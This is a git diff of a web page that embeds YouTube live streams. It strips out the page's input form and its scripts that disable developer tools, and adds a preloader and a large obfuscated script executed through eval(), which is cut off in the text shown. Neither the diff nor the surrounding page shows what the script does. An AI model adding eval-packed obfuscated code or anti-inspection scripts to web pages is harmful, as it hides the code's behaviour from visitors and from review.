@@ -20,362 +20,73 @@
 
     <!-- Theme Color for mobile browsers -->
     <title>Youtube Live stream To Embed-Convert</title>
-    
     <style>
-        /* Global reset for margin, padding, and box-sizing */
-        * {
+        body, html {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body, html {
-            font-family: 'Arial', sans-serif;
             height: 100%;
-            background: linear-gradient(120deg, #3498db, #8e44ad);
+            overflow: hidden; /* Prevent scrollbars from appearing */
+        }
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            color: #fff;
-            overflow: auto;
-            text-align: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+            opacity: 1;
         }
-
-        /* Input container */
-        .input-container {
+        #preloader.hidden {
+            opacity: 0;
+        }
+        #preloader img {
+            width: 200px;
+            height: 200px;
+        }
+        .iframe-container, .bg-image {
             position: relative;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 15px 20px;
-            border-radius: 10px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 90%;
-            max-width: 500px;
-            margin-bottom: 20px; /* Space below the input container */
-        }
-
-        input[type="text"], select, button {
-            background-color: rgba(255, 255, 255, 0.2);
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            padding: 10px 15px;
-            margin: 5px;
-            outline: none;
-            transition: background-color 0.3s ease;
             width: 100%;
-            max-width: 300px;
+            height: 100vh; /* Full viewport height */
         }
-
-        input[type="text"]:focus, select:focus, button:hover {
-            background-color: rgba(255, 255, 255, 0.4);
-        }
-
-        button {
-            cursor: pointer;
-            background: linear-gradient(120deg, #3498db, #8e44ad);
-            border: none;
-        }
-
-        /* Iframe Container */
-        .iframe-container {
-            position: relative;
-            width: 90%;
-            max-width: 1000px;
-            height: 60vh;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
-            display: none; /* Hide iframe initially */
-            margin-top: 20px; /* Space above the iframe container */
-        }
-
         iframe {
+            border: none;
             width: 100%;
             height: 100%;
-            border: none;
+            pointer-events: auto; /* Default to clickable */
         }
-
-        /* Fallback Background Image */
         .bg-image {
             display: none;
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
         }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .iframe-container {
-                height: 50vh;
-            }
-
-            .input-container {
-                width: 90%;
-                max-width: none;
-                padding: 10px;
-                box-shadow: none;
-            }
-
-            input[type="text"], select, button {
-                max-width: 100%;
-            }
-        }
-      /* Instructions container */
-.instructions-container {
-    background-color: rgba(0, 0, 0, 0.8);
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.6);
-    max-width: 90%;
-    width: 600px;
-    text-align: left;
-    margin: 20px auto;
-    animation: fadeIn 1s ease-out;
-    color: #fff;
-}
-
-/* Instructions heading */
-.instructions-container h1 {
-    font-size: 26px;
-    margin-bottom: 15px;
-    color: #f39c12;
-    border-bottom: 2px solid #f39c12;
-    padding-bottom: 10px;
-}
-
-/* Instructions list */
-.instructions-container ol {
-    margin-left: 20px;
-    line-height: 1.6;
-}
-
-.instructions-container li {
-    margin-bottom: 15px;
-}
-
-.instructions-container strong {
-    color: #f39c12;
-}
-
-/* Fade In Animation */
-@keyframes fadeIn {
-    from {
-        opacity: 0;
-        transform: translateY(20px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-/* Responsive Design */
-@media (max-width: 768px) {
-    .instructions-container {
-        width: 90%;
-        max-width: none;
-        padding: 10px;
-        box-shadow: none;
-    }
-}
-
-
     </style>
 </head>
 <body>
-
-    <!-- Input container for entering YouTube channel ID or username -->
-    <div class="input-container">
-        <label for="youtubeChannel">Enter YouTube Channel ID or Username:</label>
-        <input type="text" id="youtubeChannel" placeholder="Enter YouTube Channel ID or Username">
-
-        <label for="playerSelect">Select Player:</label>
-        <select id="playerSelect">
-            <option value="channel_id_handle">Channel ID and Username with (@)handle</option>
-            <option value="channel_username">Channel Username without (@)handle</option>
-        </select>
-
-        <button onclick="generateEmbed()">Generate Embed</button>
+    <div id="preloader">
+        <img src="https://i.postimg.cc/tgYyMmd6/giphy.webp" alt="Loading...">
     </div>
-
-    <!-- Iframe container for the live stream -->
+    
     <div class="iframe-container">
         <iframe id="dynamicIframe" frameborder="0" allowfullscreen allow="autoplay; fullscreen"></iframe>
     </div>
-    
-    <!-- Fallback background image if iframe fails to load -->
-    <div class="bg-image" id="fallbackImage" style="background-image: url('https://via.placeholder.com/1920x1080');"></div>
+    <div class="bg-image" id="fallbackImage"></div>
 
-<!-- Instructions section -->
-<div class="instructions-container">
-    <h1>How It Works</h1>
-    <p>This tool allows you to embed a live YouTube stream on this page. Follow these steps:</p>
-    <ol>
-        <li><strong>Enter YouTube Channel ID or Username:</strong> Type the channel ID or username of the YouTube channel you want to embed.</li>
-        <li><strong>Select Player Type:</strong> Choose whether you are using a channel ID and handle or just the username.</li>
-        <li><strong>Generate Embed:</strong> Click the "Generate Embed" button to load the live stream in the iframe below.</li>
-        <li><strong>View Live Stream:</strong> The live stream will be displayed in the iframe. If the iframe fails to load, a fallback image will be shown.</li>
-    </ol>
-</div>
-<section class="embed-methods">
-      <div class="container">
-        <h2>Embedding Methods</h2>
-        <p>If your website is secured with an SSL certificate, use the HTTPS protocol for the embeddable URL. Ensure your streaming URL also supports the HTTPS format:</p>
-        <p><strong>Example:</strong> https://HelloPeopleTv4you.github.io/m3u8-to-iframe/live/player1.html?url=https://example.com/playlist.m3u8</p>
-
-        <h4>Example of Embed Iframe:</h4>
-        <div class="code-snippet">
-    <pre><code>&lt;iframe 
-        frameborder="0" 
-        height="100%" 
-        width="450px" 
-        allowfullscreen="" 
-        scrolling="no" 
-        allow="autoplay;fullscreen" 
-        src="https://HelloPeopleTv4you.github.io/m3u8-to-iframe/live/player1.html?url=http://example.com/live.m3u8"&gt;
-    &lt;/iframe&gt;
-    </code></pre>
-    <button class="copy-button" onclick="copyCode()">Copy</button>
-</div>
-        
-        <h3>HTTP Method (For Non-Secured Websites)</h3>
-        <p>If your website does not have an SSL certificate, use the HTTPS protocol for embedding:</p>
-        <p><strong>Example:</strong> https://HelloPeopleTv4you.github.io/m3u8-to-iframe/live/player1.html?url=https://example.com/playlist.m3u8</p>
-      </div>
-    </section>
-  </main>
-<style>
-       
-        .container111 {
-            max-width: 500px;
-            width: 100%;
-            background: white;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-        }
-
-        #keywords-container {
-            display: flex;
-            flex-wrap: wrap;
-        }
-
-        .keyword-tag {
-            background-color: #007BFF;
-            color: white;
-            border-radius: 4px;
-            padding: 5px 10px;
-            margin: 5px;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
-
-        .keyword-tag:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
-    <div class="container111" data-keywords="keyword1,keyword2,keyword3">
-        <div id="keywords-container"></div>
-    </div>
-
-   <script>
-    function renderKeywords() {
-        const container = document.getElementById('keywords-container');
-        const dataContainer = document.querySelector('.container111');
-        const keywords = dataContainer.getAttribute('data-keywords').split(',');
-
-        container.innerHTML = ''; // Clear existing keywords
-
-        keywords.forEach(keyword => {
-            const keywordTag = document.createElement('div');
-            keywordTag.className = 'keyword-tag';
-            keywordTag.textContent = keyword;
-
-            // Add click event listener
-            keywordTag.addEventListener('click', () => {
-                alert(`You clicked on: ${keyword}`);
-                // Here you can add other actions to perform when a keyword is clicked
-            });
-
-            container.appendChild(keywordTag);
-        });
-    }
-
-    renderKeywords(); // Initial rendering of keywords
-</script>
-  <div class="container1">
-    <div class="container">
-      <p>&copy; 2024 m3u8 to iframe Converter. All rights reserved.</p>
-      <p>Author: HelloPeopleTv4you - Distributed By: <a href="#" target="_blank" title="HelloPeopleTv4you"></a></p>
-    </div>
-  </div>
-    <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>
-  <script>
-function copyCode() {
-    const codeSnippet = document.querySelector('pre code').textContent;
-    navigator.clipboard.writeText(codeSnippet).then(() => {
-        alert('Code copied to clipboard!');
-    }, (err) => {
-        console.error('Failed to copy code: ', err);
-    });
-}
-   </script>
-    <script>
-        // Function to generate the YouTube Live Embed
-        function generateEmbed() {
-            const youtubeChannel = document.getElementById('youtubeChannel').value;
-            const playerOption = document.getElementById('playerSelect').value;
-            const iframe = document.getElementById('dynamicIframe');
-            const iframeContainer = document.querySelector('.iframe-container');
-            const fallbackImage = document.getElementById('fallbackImage');
-
-            if (!youtubeChannel) {
-                alert("Please enter a valid YouTube Channel ID or Username.");
-                return;
-            }
-
-            let embedURL = '';
-
-            // Generate the appropriate YouTube embed URL based on the player selection
-            if (playerOption === 'channel_id_handle') {
-                embedURL = `https://hellopeopletv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/player.html?id=${youtubeChannel}`;
-            } else if (playerOption === 'channel_username') {
-                embedURL = `https://hellopeopletv4you.github.io/Youtube-Live-Stream-To-Embed-Convert/player.html?u=${youtubeChannel}`;
-            }
-
-            // Set the iframe src to the generated URL and show the iframe container
-            iframe.src = embedURL;
-            iframeContainer.style.display = 'block';
-
-            // Show fallback image if iframe fails to load
-            iframe.onerror = function() {
-                fallbackImage.style.display = 'block';
-                iframe.style.display = 'none';
-            }
-        }
-    </script>
-
-    <!-- Security script to prevent developer tools -->
-    <script src="https://dunggramer.github.io/disable-devtool/disable-devtool.min.js" defer></script>
-    <script src="https://cdn.staticaly.com/gh/DungGramer/disable-devtool/cbf447f/disable-devtool.min.js" defer></script>
-    <script src="https://gitcdn.xyz/repo/DungGramer/disable-devtool/master/disable-devtool.min.js" defer></script>
-    <script
-        disable-devtool-auto
-        src='https://cdn.jsdelivr.net/npm/disable-devtool'
-        url='xxx'
-        disable-menu='true'
-        detectors='xxx'
-        clear-log='true'
-    ></script>
-
+   <script>var _0xc64e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe72c(d,e,f){var g=_0xc64e[2][_0xc64e[1]](_0xc64e[0]);var h=g[_0xc64e[3]](0,e);var i=g[_0xc64e[3]](0,f);var j=d[_0xc64e[1]](_0xc64e[0])[_0xc64e[10]]()[_0xc64e[9]](function(a,b,c){if(h[_0xc64e[4]](b)!==-1)return a+=h[_0xc64e[4]](b)*(Math[_0xc64e[8]](e,c))},0);var k=_0xc64e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc64e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe72c(s,e,10)-t)}return decodeURIComponent(escape(r))}("sPgZMgsgZMPMPZMgMgZgPgsZMPMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZgsgPZMPMPZMgPPZMgggZgMMsZMggMZMggPZMPMPZMgPPZMgggZMgMMZgPgsZgMgPZgPgsZMPPMZgPgsZgPsMZMPssZMPsPZMgPsZMgPsZMggMZgggPZMggsZMPsPZMggMZMggsZMgPsZMPsPZgggPZMgMsZMgsgZgggPZMgMMZMPsPZMgMgZMgsgZMPsPZMgMgZgggPZMgsgZggMgZggggZMPMgZMgPsZMggMZMPsMZMgMMZMggsZMggMZMgMsZggggZMPMMZMggMZMggPZgPsMZggPsZgPgsZgPsMZMPssZMPsPZMgPsZMgPsZMggMZMggsZMPsPZMggMZMggsZMgPsZMPsPZMgMsZMgsgZggggZMPMgZMgPsZMggMZMPsMZMgMMZMggsZMggMZMgMsZggggZMPMMZMggMZMggPZgPsMZggPsZgPgsZgPsMZMPssZMPsPZMgPsZMgPsZMggMZMggsZMPsPZMggMZMggsZMgPsZMPsPZMgMsZMgsgZggMsZMMPPZMggMZMgsPZggggZMPsMZMgPPZMgMsZMPssZMgsPZMPMgZggggZMgPPZMggMZgPsMZsPgZMPgPZgMPMZsPgZMgsgZMPMPZMgMgZgPgsZMPMMZMgsPZMgMgZMgMgZMPsPZMgggZMgMsZgMMsZMggMZMggPZMPMPZMgPPZMgggZgPgsZgMgPZgPgsZMgggZMPsPZMgsMZgPgsZgssPZgsMgZgsPsZgPssZMgsMZMgPPZMgggZMPMsZMggMZMgsMZggggZMgPsZMggMZMPMMZMPMPZMgMsZMgPPZMggMZMgggZggggZMPssZMgMgZMPsPZMPsgZggPPZggggZMPssZMggMZMgMMZMgMsZMgggZMPMPZMggPZMPsPZgMPMZsPgZMgsgZMPMPZMgMgZgPgsZMgPPZMgMMZgMMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZgPgsZgMgPZgPgsZMPMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZgsgPZMPMPZMgPPZMgggZgMMsZMggMZMggPZMPMPZMgPPZMgggZMgMMZggggZMgMMZMggMZMggPZMPsPZgPssZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPssZMPMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZgMMsZMggMZMggPZMPMPZMgPPZMgggZggPPZgPgsZMMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMPMMZMgsPZMgMgZMgMgZMPsPZMgggZMgMsZgMMsZMggMZMggPZMPMPZMgPPZMgggZggggZMPsPZMgggZMPMsZMgMMZgssMZMgPPZMgMsZMPssZgPssZMPMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZgMMsZMggMZMggPZMPMPZMgPPZMgggZggPPZgMPMZsPgZMMgPZggPPZgMPMZsPgZMgPPZMPsgZgPgsZgPssZgPMPZMgPPZMgMMZgMMPZMgPsZMgPsZMggMZMgsMZMPsPZMPMsZggPPZgPgsZMMPMZgPgsZMgMMZMPsPZMgMsZgsMsZMgPPZMggPZMPsPZMggMZMgsPZMgMsZgPssZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPgsZgPssZggPPZgPgsZMMPMZgPgsZMgsMZMgPPZMgggZMPMsZMggMZMgsMZggggZMgPsZMggMZMPMMZMPMPZMgMsZMgPPZMggMZMgggZggggZMPssZMgMgZMPsPZMPsgZgPgsZgMgPZgPgsZgPsMZMPssZMgMsZMgMsZMggsZMgMMZgMPgZgggMZgggMZMPssZMPsPZMgPsZMgPsZMggMZMggsZMPsPZMggMZMggsZMgPsZMPsPZMgMsZMgsgZggggZMPMgZMgPsZMggMZMPsMZMgMMZMggsZMggMZMgMsZggggZMPMMZMggMZMggPZgggMZgPsMZgMPMZgPgsZMMgPZggPsZgPgsZggsPZgggsZgggsZgggsZggPPZgMPMZsPgZMMgPZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZgMMPZgsgsZgsPPZMPgMZgsPMZgMsPZMPPPZgPgsZgMgPZgPgsZgPsMZgMMPZgsPPZMMPgZMPMPZgsMMZMMPPZgMMgZMgsgZggMsZgsMgZMgPMZMPsMZgsMPZgsgsZgMssZggMsZggMsZgsgsZgssMZgsMgZgsMgZMPMsZgMMPZgssPZMgsPZMgPsZMPPgZgMMMZgsPPZMgMsZgggsZgsggZMPPPZMPPgZMggsZgMMMZMPPPZMgMPZgMMPZgPsMZgMPMZgPgsZMPMPZMgMMZMMPPZMgggZMPMMZgPgsZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPgsZMPsMZMPsPZMgMsZgMMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgMsgZMgMgZMggMZMggPZgssPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgPssZMgsPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgsgMZMgMgZgMssZMPMPZMgggZMPMsZMgPsZMPsPZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgsPZMgMgZMgPsZgPgsZgMgPZgPgsZMPgsZMPssZMgMsZMgMsZMggsZMgMMZgMPgZgggMZgggMZMgsMZMgsMZMgsMZggggZMPsMZMggMZMggMZMPsMZMgPsZMPsPZMPMPZMggsZMgPPZMgMMZggggZMPMMZMggMZMggPZgggMZMMPPZMggMZMgsPZMgMsZMgsPZMPMgZMPsPZgggMZMgsgZggMMZgggMZMgMMZMPsPZMPMPZMgMgZMPMMZMPssZgMgMZMggsZMPMPZMgMgZMgMsZgMgPZMgMMZMgggZMgPPZMggsZMggsZMPsPZMgMsZgPsgZMgMPZgMgPZgPMsZMMPMZMgsPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgsgMZMgMgZgMssZMPMPZMgggZMPMsZMgPsZMPsPZMMgPZgPsgZMgMsZMMPPZMggsZMPsPZgMgPZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgPsgZMgPMZMPsPZMMPPZgMgPZgPMsZMMPMZgMMPZgsgsZgsPPZMPgMZgsPMZgMsPZMPPPZMMgPZMPgsZgMPMZgPgsZMgMsZMgMgZMMPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgMgZMPsPZMgMMZMggsZMggMZMgggZMgMMZMPsPZgPgsZgMgPZgPgsZMPMPZMgsMZMPMPZMgPPZMgMsZgPgsZMPsgZMPsPZMgMsZMPMMZMPssZgPssZMgsPZMgMgZMgPsZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMPMsZMPMPZMgMsZMPMPZgPgsZgMgPZgPgsZMPMPZMgsMZMPMPZMgPPZMgMsZgPgsZMgMgZMPsPZMgMMZMggsZMggMZMgggZMgMMZMPsPZggggZMgPgZMgMMZMggMZMgggZgPssZggPPZgMPMZgPgsZMgPPZMPsgZgPgsZgPssZMPMsZMPMPZMgMsZMPMPZggggZMgPPZMgMsZMPsPZMggPZMgMMZggggZMgPsZMPsPZMgggZMPsMZMgMsZMPssZgPgsZgMggZgPgsZgggsZggPPZgPgsZMMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMPMsZMPMPZMgMsZMPMPZggggZMgPPZMgMsZMPsPZMggPZMgMMZMPPMZgggsZMPgPZggggZMgPPZMPMsZggggZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgMPMZgPgsZMMgPZgPgsZMPsPZMgPsZMgMMZMPsPZgPgsZMMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMgggZMgsPZMgPsZMgPsZgMPMZgPgsZMMgPZgPgsZMMgPZgPgsZMPMMZMPMPZMgMsZMPMMZMPssZgPgsZgPssZMPsPZMgMgZMgMgZMggMZMgMgZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMggMZMgPsZMPsPZggggZMPsPZMgMgZMgMgZMggMZMgMgZgPssZgPsMZgMsPZMgMgZMgMgZMggMZMgMgZgPgsZMPsgZMPsPZMgMsZMPMMZMPssZMgPPZMgggZMPsMZgPgsZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgPgsZgsPPZgMMsZgMPgZgPsMZggPsZgPgsZMPsPZMgMgZMgMgZMggMZMgMgZggPPZgMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMgggZMgsPZMgPsZMgPsZgMPMZgPgsZMMgPZgPgsZMMgPZgPgsZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPgsZMPsMZMPsPZMgMsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZgPssZMggsZMPMPZMgMgZMPMPZMggPZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgsPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPgsZgMgPZgPgsZMgggZMPsPZMgsMZgPgsZgssPZgsMgZgsPsZgsMMZMPsPZMPMPZMgMgZMPMMZMPssZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPssZMgsMZMgPPZMgggZMPMsZMggMZMgsMZggggZMgPsZMggMZMPMMZMPMPZMgMsZMgPPZMggMZMgggZggggZMgMMZMPsPZMPMPZMgMgZMPMMZMPssZggPPZgMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMgsPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZggggZMPsMZMPsPZMgMsZgPssZMggsZMPMPZMgMgZMPMPZMggPZggPPZgPgsZMMPsZMMPsZgPgsZMgggZMgsPZMgPsZMgPsZgMPMZgPgsZMMgPZgPgsZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPgsZMPsMZMPsPZMgMsZgMMPZMgPsZMgPsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPssZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgsPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPgsZgMgPZgPgsZMgggZMPsPZMgsMZgPgsZgssPZgsMgZgsPsZgsMMZMPsPZMPMPZMgMgZMPMMZMPssZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZgPssZMgsMZMgPPZMgggZMPMsZMggMZMgsMZggggZMgPsZMggMZMPMMZMPMPZMgMsZMgPPZMggMZMgggZggggZMgMMZMPsPZMPMPZMgMgZMPMMZMPssZggPPZgMPMZgPgsZMgMgZMPsPZMgMsZMgsPZMgMgZMgggZgPgsZMgsPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZMgMMZggggZMgMsZMggMZgsMMZMgMsZMgMgZMgPPZMgggZMPsMZgPssZggPPZgMPMZgPgsZMMgPZgPgsZMgsMZMgPPZMgggZMPMsZMggMZMgsMZggggZMggMZMgggZMgPsZMggMZMPMPZMPMsZgPgsZgMgPZgPgsZMPMPZMgMMZMMPPZMgggZMPMMZgPgsZMPsgZMgsPZMgggZMPMMZMgMsZMgPPZMggMZMgggZgPssZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgPgsZgMgPZgPgsZMPMsZMggMZMPMMZMgsPZMggPZMPsPZMgggZMgMsZggggZMPsMZMPsPZMgMsZgMsPZMgPsZMPsPZMggPZMPsPZMgggZMgMsZgMMgZMMPPZgsPPZMPMsZgPssZgPsMZMPMsZMMPPZMgggZMPMPZMggPZMgPPZMPMMZgsPPZMPsgZMgMgZMPMPZMggPZMPsPZgPsMZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgMMMZMggMZMgggZMgMsZMPMPZMgPPZMgggZMPsPZMgMgZgPgsZgMgPZgPgsZMPMsZMggMZMPMMZMgsPZMggPZMPsPZMgggZMgMsZggggZMgMPZMgsPZMPsPZMgMgZMMPPZgsMMZMPsPZMgPsZMPsPZMPMMZMgMsZMggMZMgMgZgPssZgPsMZggggZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgggPZMPMMZMggMZMgggZMgMsZMPMPZMgPPZMgggZMPsPZMgMgZgPsMZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMPsgZMPMPZMgPsZMgPsZMPMgZMPMPZMPMMZMgPMZgsPPZMggPZMPMPZMPsMZMPsPZgPgsZgMgPZgPgsZMPMsZMggMZMPMMZMgsPZMggPZMPsPZMgggZMgMsZggggZMPsMZMPsPZMgMsZgMsPZMgPsZMPsPZMggPZMPsPZMgggZMgMsZgMMgZMMPPZgsPPZMPMsZgPssZgPsMZMPsgZMPMPZMgPsZMgPsZMPMgZMPMPZMPMMZMgPMZgsPPZMggPZMPMPZMPsMZMPsPZgPsMZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMggsZMgMgZMPsPZMgPsZMggMZMPMPZMPMsZMPsPZMgMgZgPgsZgMgPZgPgsZMPMsZMggMZMPMMZMgsPZMggPZMPsPZMgggZMgMsZggggZMPsMZMPsPZMgMsZgMsPZMgPsZMPsPZMggPZMPsPZMgggZMgMsZgMMgZMMPPZgsPPZMPMsZgPssZgPsMZMggsZMgMgZMPsPZMgPsZMggMZMPMPZMPMsZMPsPZMgMgZgPsMZggPPZgMPMZgPgsZMgPsZMPsPZMgMsZgPgsZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgPgsZgMgPZgPgsZMgggZMgsPZMgPsZMgPsZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgPPZMPMsZgPgsZgMgPZgPgsZMPsMZMPsPZMgMsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZgPssZgPsMZMgPPZMPMsZgPsMZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMgsPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgPgsZgMgPZgPgsZMPsMZMPsPZMgMsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZgPssZgPsMZMgsPZgPsMZggPPZgMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMPMMZMgPsZMgPPZMPMMZMgPMZgPgsZgMgPZgPgsZMPsMZMPsPZMgMsZgssPZMgMgZMgPsZgsgsZMPMPZMgMgZMPMPZMggPZgPssZgPsMZMPMMZMgPsZMgPPZMPMMZMgPMZgPsMZggPPZgMPMZgPgsZMgPPZMPsgZgPgsZgPssZMgsPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZggPPZgPgsZMMPMZgPgsZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgPgsZgMgPZgPgsZMPMPZMgsMZMPMPZMgPPZMgMsZgPgsZMPsMZMPsPZMgMsZgMMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgMsgZMgMgZMggMZMggPZgssPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgPssZMgsPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZggPPZgMPMZgPgsZMMgPZgPgsZMgPPZMPsgZgPgsZgPssZMgPPZMPMsZgPgsZgPsgZgPsgZgPgsZgPMPZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZggPPZgPgsZMMPMZgPgsZMgPPZMPsgZgPgsZgPssZMgPPZMPMsZggggZMgMMZMgMsZMPMPZMgMgZMgMsZMgMMZgssMZMgPPZMgMsZMPssZgPssZgPsMZgMgsZgPsMZggPPZggPPZgPgsZMMPMZgPgsZMPMMZMggMZMgggZMgMMZMgMsZgPgsZMPssZMPMPZMgggZMPMsZMgPsZMPsPZgPgsZgMgPZgPgsZMgPPZMPMsZggggZMgMMZMgPsZMgPPZMPMMZMPsPZgPssZggMPZggPPZgMPMZgPgsZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgPgsZgMgPZgPgsZMPMPZMgsMZMPMPZMgPPZMgMsZgPgsZMPsMZMPsPZMgMsZgMMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgMsgZMgMgZMggMZMggPZgssPZMgMMZMPsPZMgMgZMgggZMPMPZMggPZMPsPZgPssZMPssZMPMPZMgggZMPMsZMgPsZMPsPZggPPZgMPMZgPgsZMMgPZgPgsZMPsPZMgPsZMgMMZMPsPZgPgsZMMPMZgPgsZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZgPgsZgMgPZgPgsZMgPPZMPMsZgMPMZgPgsZMMgPZgPgsZMMgPZgPgsZMgPPZMPsgZgPgsZgPssZgPMPZMPMMZMPssZMPMPZMgggZMgggZMPsPZMgPsZgsPPZMPMsZggPPZgPgsZMMPMZgPgsZMgPPZMPsgZMgMgZMPMPZMggPZMPsPZgMMMZMggMZMgggZMgMsZMPMPZMgPPZMgggZMPsPZMgMgZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMPMsZMgPPZMgMMZMggsZMgPsZMPMPZMMPPZgPgsZgMgPZgPgsZgPsMZMgggZMggMZMgggZMPsPZgPsMZgMPMZgPgsZMPsgZMPMPZMgPsZMgPsZMPMgZMPMPZMPMMZMgPMZgsPPZMggPZMPMPZMPsMZMPsPZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMPMgZMPMPZMPMMZMgPMZMPsMZMgMgZMggMZMgsPZMgggZMPMsZgsPPZMggPZMPMPZMPsMZMPsPZgPgsZgMgPZgPgsZgPsMZMgsPZMgMgZMgPsZgPssZgPMgZMPssZMgMsZMgMsZMggsZMgMMZgMPgZgggMZgggMZMgPPZggggZMMPPZMgMsZMgPPZMggPZMPsMZggggZMPMMZMggMZMggPZgggMZMgsgZMgPPZgggMZgMMsZgMMgZggsgZggssZgsMsZggMgZMgMMZggsMZMPsMZMPsgZgsPPZgggMZMgMMZMPMsZMPMsZMPsPZMPsgZMPMPZMgsPZMgPsZMgMsZggggZMgPgZMggsZMPsMZgPMgZggPPZgPsMZgMPMZgPgsZMPsgZMPMPZMgPsZMgPsZMPMgZMPMPZMPMMZMgPMZgsPPZMggPZMPMPZMPsMZMPsPZggggZMgMMZMgMsZMMPPZMgPsZMPsPZggggZMPMsZMgPPZMgMMZMggsZMg